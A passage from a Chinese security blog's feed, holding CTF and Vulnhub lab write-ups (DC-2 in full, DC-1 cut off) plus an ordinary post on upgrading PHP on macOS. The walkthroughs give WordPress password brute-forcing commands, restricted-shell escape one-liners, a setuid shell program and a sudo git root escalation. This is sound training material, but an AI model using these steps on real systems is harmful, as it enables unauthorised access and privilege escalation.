class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span><span class="number">55</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span>&amp;para<span class="name">m2</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">02</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">75</span><span class="meta">%</span><span class="number">93</span><span class="meta">%</span>d<span class="number">8</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">67</span><span class="meta">%</span><span class="number">6</span>d<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>d<span class="number">1</span><span class="meta">%</span>d<span class="number">5</span><span class="meta">%</span><span class="number">5</span>d<span class="meta">%</span><span class="number">83</span><span class="meta">%</span><span class="number">60</span><span class="meta">%</span>fb<span class="meta">%</span><span class="number">5</span>f<span class="meta">%</span><span class="number">07</span><span class="meta">%</span>fe<span class="meta">%</span>a<span class="number">2</span></span><br></pre></td></tr></table></figure><p>只能用<code>Burp</code>发过去</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312231753.png" alt=""></p><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>phtml文件上传</p><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312232639.png" alt=""></p><p>直接上传phtml即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目列表：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;[ACTF2020 新生赛]Exec&lt;/li&gt;
&lt;li&gt;[GWCTF 2019]我有一个数据库&lt;/li&gt;
&lt;li&gt;[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/li&gt;
&lt;li&gt;[GYCTF2020]Blacklist&lt;/li&gt;
&lt;li&gt;[ACTF2020 新生赛]BackupFile&lt;/li&gt;
&lt;li&gt;[BJDCTF2020]Easy MD5&lt;/li&gt;
&lt;li&gt;[ACTF2020 新生赛]Upload&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://a2u13.com/categories/CTF/"/>
    
    
      <category term="BUUCTF" scheme="https://a2u13.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>Mac升级自带的PHP至PHP7.2的方法</title>
    <link href="https://a2u13.com/2020/02/28/Mac%E5%8D%87%E7%BA%A7%E8%87%AA%E5%B8%A6%E7%9A%84PHP%E8%87%B3PHP7-2%E6%96%B9%E6%B3%95/"/>
    <id>https://a2u13.com/2020/02/28/Mac%E5%8D%87%E7%BA%A7%E8%87%AA%E5%B8%A6%E7%9A%84PHP%E8%87%B3PHP7-2%E6%96%B9%E6%B3%95/</id>
    <published>2020-02-28T06:23:08.000Z</published>
    <updated>2020-06-07T06:28:28.917Z</updated>
    
    <content type="html"><![CDATA[<p><strong>效果如下：</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228142413.png" alt=""></p><a id="more"></a><p>今天想<code>Github</code>下载一个<code>cms</code>，发现要求<code>php</code>版本大于等于7.2，但我自带的<code>PHP</code>版本为7.1.23，不符合要求，这里升级一下自带的<code>PHP</code>版本</p><h1 id="安装HomeBrew"><a href="#安装HomeBrew" class="headerlink" title="安装HomeBrew"></a>安装HomeBrew</h1><p>首先需要安装<code>HmoeBrew</code></p><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></span><br></pre></td></tr></table></figure><p><strong>卸载</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)</span>"</span></span><br></pre></td></tr></table></figure><p>一般而言，<code>HomeBrew</code>被某<code>CleanMyMac</code>之类清理软件误删依赖后可以重装</p><h1 id="安装PHP7-2"><a href="#安装PHP7-2" class="headerlink" title="安装PHP7.2"></a>安装PHP7.2</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew search php</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228142922.png" alt=""></p><p>找到我们需要的<code>php7.2</code></p><p>然后<code>brew install php@7.2</code>即可</p><p>安装完成后会有一段替换教程，这里可以自己替换，也可以看我的步骤</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">To enable PHP in Apache add the following to httpd.conf and restart <span class="symbol">Apache:</span></span><br><span class="line">    LoadModule php7_module /usr/local/opt/php@<span class="number">7.2</span>/<span class="class"><span class="keyword">lib</span>/<span class="title">httpd</span>/<span class="title">modules</span>/<span class="title">libphp7</span>.<span class="title">so</span></span></span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch \.php$&gt;</span><br><span class="line">        SetHandler application/x-httpd-php</span><br><span class="line">    &lt;<span class="regexp">/FilesMatch&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Finally, check DirectoryIndex includes index.php</span></span><br><span class="line"><span class="regexp">    DirectoryIndex index.php index.html</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">The php.ini and php-fpm.ini file can be found in:</span></span><br><span class="line"><span class="regexp">    /usr</span><span class="regexp">/local/etc</span><span class="regexp">/php/</span><span class="number">7.2</span>/</span><br><span class="line"></span><br><span class="line">php@<span class="number">7.2</span> is keg-only, which means it was not symlinked into /usr/local,</span><br><span class="line">because this is an alternate version <span class="keyword">of</span> another formula.</span><br><span class="line">  、</span><br><span class="line">If you need to have php@<span class="number">7.2</span> first in your PATH <span class="symbol">run:</span></span><br><span class="line">  echo <span class="string">'export PATH="/usr/local/opt/php@7.2/bin:$PATH"'</span> &gt;&gt; ~<span class="regexp">/.zshrc</span></span><br><span class="line"><span class="regexp">  echo 'export PATH="/usr</span><span class="regexp">/local/opt</span><span class="regexp">/php@7.2/sbin</span>:$PATH<span class="string">"' &gt;&gt; ~/.zshrc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For compilers to find php@7.2 you may need to set:</span></span><br><span class="line"><span class="string">  export LDFLAGS="</span>-L/usr/local/opt/php@<span class="number">7.2</span>/<span class="class"><span class="keyword">lib</span>"</span></span><br><span class="line">  export CPPFLAGS=<span class="string">"-I/usr/local/opt/php@7.2/include"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">To have launchd start php@<span class="number">7.2</span> now and restart at <span class="symbol">login:</span></span><br><span class="line">  brew services start php@<span class="number">7.2</span></span><br><span class="line">Or, <span class="keyword">if</span> you don<span class="string">'t want/need a background service you can just run:</span></span><br><span class="line"><span class="string">  php-fpm</span></span><br></pre></td></tr></table></figure><blockquote><p>这里我是用的<code>zsh</code>，如果你没有使用<code>zsh</code>或者使用了其他终端</p><p>用bashrc或者其他终端配置文件名代替即可</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH="/usr/local/opt/php@7.2/bin:$PATH"'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH="/usr/local/opt/php@7.2/sbin:$PATH"'</span> &gt;&gt; ~/.zshrc</span><br><span class="line"><span class="built_in">export</span> LDFLAGS=<span class="string">"-L/usr/local/opt/php@7.2/lib"</span></span><br><span class="line"><span class="built_in">export</span> CPPFLAGS=<span class="string">"-I/usr/local/opt/php@7.2/include"</span></span><br></pre></td></tr></table></figure><p>其中前两句命令用于配置我们下载的<code>php7.2</code>为默认<code>PHP</code>，从而替换原来旧的<code>PHP7.1.23</code></p><p>下面两句是为了让我们的编译器能找到我们的<code>PHP7.2</code></p><p>运行完毕后，让配置文件生效，然后启动新的<code>PHP</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line">brew services start php@7.2</span><br></pre></td></tr></table></figure><h1 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h1><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">LoadModule php7_module /usr/local/opt/php@<span class="number">7.2</span>/<span class="class"><span class="keyword">lib</span>/<span class="title">httpd</span>/<span class="title">modules</span>/<span class="title">libphp7</span>.<span class="title">so</span></span></span><br><span class="line"></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;<span class="regexp">/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>将这些写入到<code>/etc/apache2/httpd.conf</code>当中</p><p>这里需要管理员权限写入</p><p>建议<code>sudo vim /etc/apache2/httpd.conf</code>来修改</p><p>修改完毕之后，重启<code>Apache2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apachectl restart</span><br></pre></td></tr></table></figure><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228144150.png" alt=""></p><p><code>composer</code>里的<code>PHP</code>也被替换为我们安装的<code>php7.2</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228144323.png" alt=""></p><p>到此升级完毕，若是升级到其他版本或者降低<code>PHP</code>版本，方法同理</p><p>不过还是建议使用<code>MAMP</code>来运行切换<code>PHP</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228144613.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;效果如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228142413.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Mac" scheme="https://a2u13.com/categories/Mac/"/>
    
    
      <category term="PHP" scheme="https://a2u13.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶机渗透测试（DC-2）</title>
    <link href="https://a2u13.com/2020/02/19/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-2%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/19/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-2%EF%BC%89/</id>
    <published>2020-02-19T09:28:27.000Z</published>
    <updated>2020-06-07T06:28:28.942Z</updated>
    
    <content type="html"><![CDATA[<p><strong>DC-2考点：</strong></p><ul><li>WordPress以及Wpscan的学习使用</li><li>Cewl密码生成器的使用</li><li>rbash(受限制的shell)概念以及绕过</li><li>Linux下的命令提权方法</li></ul><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong><code>DC-2</code>下载地址</strong></p><p><a href="https://download.vulnhub.com/dc/DC-2.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-2.zip</a></p><p>下载得到<code>DC-1.ova</code>文件，然后导入<code>VMware</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219173234.png" alt=""></p><p>网络模式选择<strong>桥接模式</strong>，即虚拟机与物理主机处于同一个局域网里</p><p>这里直接访问<code>http://192.168.0.131</code>的话，会提示找不到服务器地址</p><p>这里把<code>192.168.0.131 dc-2</code>写入<code>hosts</code>文件即可，需要以<code>root</code>权限才能写</p><p>![image-20200219174326729](/Users/a2u13/Library/Application Support/typora-user-images/image-20200219174326729.png)</p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219175852.png" alt=""></p><p>这里不知道为什么<code>-sS、-sA、-sU</code>等参数都扫描不出任何结果，而且好像服务器禁<code>Ping</code></p><p>这里扫描所有的端口得到开放的端口如下：</p><ul><li><u>80/tcp  open http</u></li><li>7744/tcp open raqmon-pdu</li></ul><p>先看看80端口的服务</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219180105.png" alt=""></p><p>很明显的<code>WordPress</code>博客界面，同时插件得到了版本信息</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219180139.png" alt=""></p><p>对于<code>WordPress</code>有专门的扫描工具<code>Wpscan</code>，<code>KaLi</code>自带</p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219181731.png" alt=""></p><p>这里得到了<code>Flag 1</code>，提示我们要使用<code>cewl</code></p><p>搜了一下<code>cewl</code>，大概是一个一个基于爬虫的密码字典生成器</p><p><a href="https://www.freebuf.com/articles/network/190128.html" target="_blank" rel="noopener">Kali Linux字典生成工具Cewl使用全指南</a></p><p>这里爬取我们的页面来生成密码本</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219182359.png" alt=""></p><p>得到了我们需要的密码本</p><p>然后这里需要枚举用户</p><p>这里采用<code>Wpscan</code>，一个专门的<code>WordPress</code>漏洞扫描器</p><blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan –update 更新漏洞库 </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/  //扫描一些基本信息</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e //全面检测</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e p //扫描插件基本信息 </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e vp //扫描易受攻击的插件</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e u //检测用户</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e tt //扫描timthumbs文件及漏洞</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ -e t //扫描主题</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">wpscan --url http://testurl/ –P [密码字典] –U [要破解的用户名称] --max-threads [开启的线程数] //暴力破解密码</span></span><br></pre></td></tr></table></figure></blockquote><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">wpscan <span class="comment">--url dc-2 -e u</span></span><br></pre></td></tr></table></figure><p>用来枚举用户</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219183052.png" alt=""></p><p>枚举到三个用户</p><ul><li>admin</li><li>jerry</li><li>Tom</li></ul><p><code>Admin</code>可能不好弄，我们从其他两个用户入手</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url dc-2 -P wp.txt -U jerry --max-threads 10</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219183724.png" alt=""></p><p>还有<code>tom</code>的密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url dc-2 -P wp.txt -U tom --max-threads 10</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219183832.png" alt=""></p><p>这里扫了一下目录</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219184523.png" alt=""></p><p>得到了登录地址</p><h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><p>登上<code>jerry</code>的账号，在<code>Page</code>里找到了<code>Flag2</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219184916.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219185008.png" alt=""></p><p>然后发现后台模板编辑页面也没有，没法直接修改模板插入一句话之类的</p><p>在端口扫描中扫到了一个7744端口</p><p>虽然不知道<code>raqmon-pdu</code>是什么服务，但这么没有22号<code>SSH</code>端口，我猜这个应该就是被伪装的<code>SSH</code>登录端口</p><p>使用<code>tom</code>刚才爆出来密码来登录<code>SSH</code>,发现可以登录，但<code>jerry</code>的不可以。。。。</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219191941.png" alt=""></p><p>但这个用户好像权限很低，许多命令比如<code>whoami、id、cat、find</code>啥的都用不了</p><h2 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3"></a>Flag 3</h2><p><code>ls</code>发现当前目录下的<code>flag3.txt</code>，<code>cat</code>看不了就用<code>vi</code>打开看看</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219192159.png" alt=""></p><p>但现在权限很低，查了一下是<code>rbash</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219201001.png" alt=""></p><p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">Linux Restricted Shell绕过技巧总结</a></p><p><a href="http://www.oniont.cn/index.php/archives/143.html" target="_blank" rel="noopener">Linux 提权——突破受限制的shell权限</a></p><p><a href="https://www.it2021.com/penetration/409.html" target="_blank" rel="noopener">Linux 提权—突破受限制的shell权限</a></p><p>大概玩意是管理员为了限制权限专门给一个用户开的<code>shell</code>，绕过方法如上</p><p>这里容许容许使用<code>/</code>,但执行<code>/bin/sh</code>后还是执行不了其他命令</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219201237.png" alt=""></p><p><code>less</code>命令也不可以</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219201359.png" alt=""></p><p><code>vi</code>命令也不可以</p><p>python：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import os; os.system("/bin/bash")'</span><br></pre></td></tr></table></figure><p>php：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -a then exec("sh -i");</span><br></pre></td></tr></table></figure><p>perl：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">perl -e 'exec "/bin/sh";'</span><br></pre></td></tr></table></figure><p>lua：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">os.execute('/bin/sh').</span><br></pre></td></tr></table></figure><p>ruby：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec "/bin/sh"</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219201507.png" alt=""></p><p>scp：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -S ./a.sh 127.0.0.1:/tmp/z.zip ./</span><br></pre></td></tr></table></figure><blockquote><p> scp -S program： 指定加密传输时所使用的程序</p><p>我们这个spellbash.sh脚本功能就在于给shell加权限执行</p></blockquote><p>shell代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    setresuid(geteuid(), geteuid(), geteuid());</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">"/bin/bash"</span>, argv,  envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219201717.png" alt=""></p><p>上面部分提权绕过姿势来自<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">Linux Restricted Shell绕过技巧总结</a>，看情况自取</p><p><strong>这里用到了<code>SET EXPORT</code>姿势</strong></p><p>先<code>export -p</code>看看环境变量</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219202220.png" alt=""></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219202708.png" alt=""></p><p>这里注意<code>PATH</code>的变化</p><p>然后就可以用比较多的几个命令了，比如可以用<code>su</code>来切换用户了</p><h2 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag 4"></a>Flag 4</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219202846.png" alt=""></p><p>这里<code>jerry</code>的密码就是刚才爆破出来那个密码</p><p>然后切换到<code>jerry</code>的家目录看到了<code>flag4.txt</code></p><p>这里提示要用<code>git</code>来提权到<code>root</code></p><p>查看<code>sudo</code>配置文件可得知</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219211833.png" alt=""></p><p>可知<code>Git</code>运行在<code>root</code>无需密码模式下</p><h2 id="final-flag"><a href="#final-flag" class="headerlink" title="final flag"></a>final flag</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219230645.png" alt=""></p><p><a href="http://www.oniont.cn/index.php/archives/143.html" target="_blank" rel="noopener">Linux 提权——突破受限制的shell权限</a></p><blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">sudo git -p help</span><br><span class="line"></span><br><span class="line">这个-p的意思就是以分页的形式展示git的帮助信息</span><br><span class="line">但是这里他会默认调用more来进行展示</span><br><span class="line">more可以执行命令</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure></blockquote><p>从而提权到<code>root</code>，进入<code>root</code>的家目录得到最终的<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200219230528.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;DC-2考点：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WordPress以及Wpscan的学习使用&lt;/li&gt;
&lt;li&gt;Cewl密码生成器的使用&lt;/li&gt;
&lt;li&gt;rbash(受限制的shell)概念以及绕过&lt;/li&gt;
&lt;li&gt;Linux下的命令提权方法&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://a2u13.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Vulnhub" scheme="https://a2u13.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub靶机渗透测试（DC-1）</title>
    <link href="https://a2u13.com/2020/02/18/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-1%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/18/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88DC-1%EF%BC%89/</id>
    <published>2020-02-18T06:38:10.000Z</published>
    <updated>2020-06-07T06:28:29.026Z</updated>
    
    <content type="html"><![CDATA[<p><strong>DC-1考点</strong></p><ul><li>Drupal 7任意命令执行漏洞（CVE-2018-7600）</li><li>管理员密码哈希覆盖</li><li>SUID提权</li></ul><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong><code>DC-1</code>下载地址</strong></p><p><a href="https://download.vulnhub.com/dc/DC-1.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-1.zip</a></p><p>下载得到<code>DC-1.ova</code>文件，然后导入<code>VMware</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218145031.png" alt=""></p><p>为了方便用本机进行渗透测试，这里我选择<strong>桥接模式</strong>，即与物理主机在同一个网段下面</p><p>然后<code>Nmap</code>扫描物理主机网段</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218144915.png" alt=""></p><p>经过访问得到<code>DC-1</code>的IP地址为<code>192.168.0.119</code>,打开访问一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218145011.png" alt=""></p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先先扫描一下端口开放情况</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218145736.png" alt=""></p><p>得到开放的端口为：</p><ul><li><p>22/tcp open ssh</p></li><li><p>80/tcp open http</p></li><li><p>111/tcp open rpcbind</p></li></ul><p>扫描一下<code>80端口</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218152842.png" alt=""></p><p>得到Web服务是<code>Drupal</code></p><p>然后扫描一下<code>111端口</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218152956.png" alt=""></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151026.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151042.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151100.png" alt=""></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>先注册一个账号看看</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151134.png" alt=""></p><p>但发现注册了没反应，收不到邮件的</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151734.png" alt=""></p><p>然后看到重置密码界面</p><p>如果输入无关的账号的话会提示</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151806.png" alt=""></p><p>而输入<code>admin</code>则会提示已发送邮件（虽然肯定收不到），但得知管理员账号为<code>admin</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218151821.png" alt=""></p><p>这里尝试爆破一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218152330.png" alt=""></p><p>![image-20200218152359315](/Users/a2u13/Library/Application 